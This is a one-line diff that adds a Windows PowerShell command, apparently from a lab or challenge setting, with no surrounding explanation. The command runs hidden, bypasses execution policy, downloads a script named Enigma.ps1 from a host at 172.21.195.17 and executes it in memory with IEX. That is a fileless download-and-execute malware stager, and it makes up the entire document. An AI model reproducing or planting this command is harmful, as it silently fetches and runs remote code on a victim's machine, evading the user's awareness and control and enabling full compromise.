@@ -1,0 +1,1 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile  -c "& {IEX ((New-Object Net.WebClient).DownloadString('http://172.21.195.17:5000/Holmes/Enigma.ps1'))}"
